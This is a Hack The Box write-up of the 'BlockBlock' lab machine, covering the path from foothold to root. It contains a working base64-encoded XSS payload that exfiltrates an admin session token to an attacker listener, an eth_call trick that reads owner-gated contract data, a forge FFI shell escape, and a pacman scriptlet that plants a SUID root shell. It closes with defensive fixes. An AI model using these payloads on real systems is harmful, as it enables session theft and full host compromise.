# BlockBlock ("DBLC") — Hack The Box write-up

> **Platform:** Hack The Box · **Difficulty:** Hard · **OS:** Linux · Retired.
> Target handed over as an IP only; the name "BlockBlock" is the box's own
> hostname, recovered after foothold. Flags shown as `<32-hex-flag>`; the
> attacker VPN address is generalised to `10.10.14.x`.

**TL;DR:** A chat app escapes message *content* but not the *username*, so a
self-registered user whose name is an XSS payload runs JavaScript in the
moderator bot and steals the admin JWT. Admin unlocks a JSON-RPC proxy; because
the Solidity contracts store passwords on a public ledger and `onlyOwner` only
guards writes, an `eth_call` with a spoofed `from` reads the admin password.
That password is reused for SSH (`keira`). From there two sudo rules — `forge`
(FFI → shell) then `pacman` (package scriptlet → root) — walk to root.

## Reconnaissance

    nmap -Pn -sCV -p- <target>
    22/tcp   OpenSSH 9.7
    80/tcp   Werkzeug/3.0.3 Python/3.12.3   — "DBLC", a blockchain chat app
    8545/tcp Ethereum JSON-RPC

Port 8545 is the tell: a dev Ethereum node exposed beside the web app. Hitting it
directly, only `eth_blockNumber` answers — everything else returns
`{"error":"Proxy Couldn't verify token"}`. So a **filtering proxy** sits in front
of the node and wants a token we do not have yet. Park it; the token clearly
comes from the app.

## Enumeration

Registering (`/api/register` needs `username`, `password`, `repeatedPassword`)
and logging in sets a JWT in a `token` cookie. `GET /api/info` returns your role
and — notably — your raw token. Authenticated routes: `/chat`, `/profile`,
`/api/send_message`, `/api/recent_messages` (per-user), `/api/get_user_messages`
(moderator-only), `/api/report_user`.

`/api/contract_source` returns `Chat.sol` and `Database.sol`, and reading them is
the whole game:

- `Database` stores `users[name] = {password, role, exists}`. The constructor
  seeds `admin` and a `secondaryAdminUsername` with the **same password**.
- Every getter (`getAccount`, `getUserMessages`, …) is `onlyOwner`.

The JWT is HS256. Cracking it (rockyou, rockyou+best64) **fails** — the secret is
not a dictionary word. The right dead end to abandon early.

## Foothold

### The sink is the username, not the message

`chat.js` escapes message content client-side, and the moderator view
(`/api/get_user_messages`) escapes `msg.content` too — but renders the sender
name raw:

    <div class="msg-info-name">${msg.sender}</div>   // innerHTML, unescaped

Usernames accept arbitrary HTML at registration. So the XSS goes in the
**username**, and the moderator bot detonates it when it reviews a reported user.

**The trap that cost the most time:** the first payloads failed silently. It was
not CSP or egress — I confirmed the bot executes JS (it registered a marker
account on my behalf) and confirmed egress with an unconditional `/ping` that
landed. The cause was **spaces**: the reported username is passed through
`get_user_messages?username=<sender>`, and a space breaks that lookup. A payload
survives the round-trip only if it is space-free, so base64 the JS and
`eval(atob())` it:

    // username:
    <img src=x onerror=eval(atob('<base64 of:
      var x=new XMLHttpRequest();
      x.open("GET","/api/info",false); x.send();
      new Image().src="http://10.10.14.x/S?d="+encodeURIComponent(x.responseText)
    >'))>

Register that user, send any message (so the moderator view has a row), report
it. Seconds later the moderator's `/api/info` — `role: admin` — arrives on the
listener.

### Admin unlocks the chain, not a shell

With the admin cookie, `/admin` loads and its JS reveals the RPC path:

    GET  /api/json-rpc           -> {"Authorization":"<proxy-token>"}
    POST /api/json-rpc           (admin cookie + header `token: <proxy-token>`) -> real RPC

The proxy token is *handed to admins*. Now RPC works. `eth_accounts` returns the
single node account — the contract **owner**.

### Reading an onlyOwner getter without being the owner

`onlyOwner` checks `msg.sender`, but `eth_call` is a *simulated* call where you
set `from` to anything. Point `from` at the owner and the modifier passes:

    eth_call  Chat.database()                       -> Database address
    eth_call  Database.getAccount("admin")  from=owner
      -> ("admin", "SomedayBitCoinWillCollapse", "admin")

(Equivalently, `eth_getStorageAt` reads the mapping slot directly — storage is
public. `eth_getLogs` over `AccountRegistered` also replays every username.)

### Password reuse → SSH

`admin` is not an SSH user. The `AccountRegistered` log shows the first account
seeded at deploy: `keira`, same password:

    keira@blockblock:~$ cat user.txt
    <32-hex-flag>

## Privilege escalation

### keira → paul via Foundry FFI

    keira@blockblock:~$ sudo -l
    (paul : paul) NOPASSWD: /home/paul/.foundry/bin/forge

`forge script` runs arbitrary OS commands via the Solidity FFI cheatcode when
`ffi = true`. A throwaway project with `ffi = true` in `foundry.toml` and a
`run()` that calls `vm.ffi(["/bin/bash","-c","<cmd>"])`, launched with
`sudo -u paul forge script … --ffi`, executes `<cmd>` as paul.

### paul → root via pacman

    paul sudo: (ALL : ALL) NOPASSWD: /usr/bin/pacman

`pacman -U` runs a package's `post_install` scriptlet as root. Build a minimal
package with `makepkg` (present, with `fakeroot`/`zstd`) whose scriptlet does the
root action, then install it:

    # PKGBUILD: install=pwn.install
    # pwn.install: post_install(){ cp /bin/bash /usr/local/bin/rb; chmod 4755 /usr/local/bin/rb; }
    makepkg -df --skipinteg
    sudo pacman -U --noconfirm pwn-1-1-any.pkg.tar.zst

`/dev/shm` and `/tmp` are `nosuid`, so the SUID bash must land on `/` (e.g.
`/usr/local/bin`). Then:

    keira@blockblock:~$ /usr/local/bin/rb -p -c 'id; cat /root/root.txt'
    uid=1000(keira) euid=0(root) ...
    <32-hex-flag>

## What would have stopped this

Escape the username on output. The whole chain is bootstrapped by one
admin-session takeover; without the XSS the attacker never gets the proxy token,
never reads the on-chain password, and never reaches SSH. Fixing the sudo rules
stops the escalation, but output-encoding one field is the earliest, cheapest
break.

## Lessons

- Escaping *one* user field and not another is a classic near-miss; enumerate
  every output sink, not just the obvious one.
- A blind XSS that "doesn't fire" is often a delivery-context bug (here, spaces
  breaking a query parameter), not a filter. Separate "did JS run" from "did my
  beacon leave" with an unconditional canary before blaming egress.
- On-chain "private" is a myth: `onlyOwner` guards state changes, never reads,
  and `eth_call` with a spoofed `from` defeats owner-gated getters outright.
